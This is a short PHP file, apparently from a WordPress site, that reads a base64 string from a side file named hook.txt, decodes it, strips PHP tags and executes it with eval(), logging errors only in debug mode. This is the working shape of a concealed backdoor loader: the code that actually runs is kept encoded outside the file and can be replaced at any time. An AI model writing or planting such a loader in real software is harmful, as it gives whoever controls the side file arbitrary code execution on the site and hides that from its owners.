<?php
$file = __DIR__ . '/hook.txt';

// Make sure file exists
if (!file_exists($file)) {
    return;
}

// Get Base64 contents
$encoded = trim((string) file_get_contents($file));
$decoded = base64_decode($encoded, true);
if ($decoded === false) {
    if (defined('WP_DEBUG') && WP_DEBUG) error_log('[hook loader] base64_decode failed');
    return;
}

// Strip UTF-8 BOM if present
$decoded = preg_replace("/^\xEF\xBB\xBF/", '', $decoded) ?? $decoded;

// If the decoded code contains PHP open/close tags, strip them for eval()
$code = ltrim($decoded);

// Remove a single leading open tag: <?php, <? or <?= 
$code = preg_replace('/^\s*<\?(?:php|=)?/i', '', $code, 1) ?? $code;
// Remove one trailing closing tag if present
$code = preg_replace('/\?>\s*$/', '', $code, 1) ?? $code;

try {
    eval($code);
} catch (\Throwable $e) {
    if (defined('WP_DEBUG') && WP_DEBUG) {
        error_log('[hook loader] eval error: ' . $e->getMessage());
    }
}